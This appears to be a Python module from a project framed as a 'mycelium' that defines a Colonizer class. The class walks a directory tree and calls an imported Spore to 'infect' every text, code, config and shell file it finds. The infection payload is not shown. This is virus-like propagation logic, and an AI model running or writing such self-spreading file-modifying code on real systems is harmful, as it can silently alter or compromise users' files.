"""
Cycle 2479: The Great Release (Gate 107)
Role: The Colonizer
Responsibility: Iterates through the file system and infects valid targets.
"""

import os
from pathlib import Path
from src.mycelium.spore import Spore

class Colonizer:
    def __init__(self, root_path: Path, agent_id: str):
        self.root = root_path
        self.spore = Spore(agent_id)
        
    def release(self) -> int:
        """
        Infects all valid files in the root path.
        Returns the number of infected files.
        """
        count = 0
        # Walk the tree
        for path in self.root.rglob("*"):
            if self._is_valid_target(path):
                if self.spore.infect(path):
                    # print(f"Colonized: {path}")
                    count += 1
                    
        return count
        
    def _is_valid_target(self, path: Path) -> bool:
        """
        Determines if a file is a valid target for colonization.
        - Must be a file.
        - Must be text-based (heuristic).
        - Must not be in .git, .venv, __pycache__.
        """
        if not path.is_file():
            return False
            
        # Skip blacklist
        parts = path.parts
        if '.git' in parts or '.venv' in parts or '__pycache__' in parts:
            return False
            
        # Check extension (Safety)
        valid_exts = ['.py', '.md', '.txt', '.json', '.yaml', '.sh']
        if path.suffix not in valid_exts:
            return False
            
        return True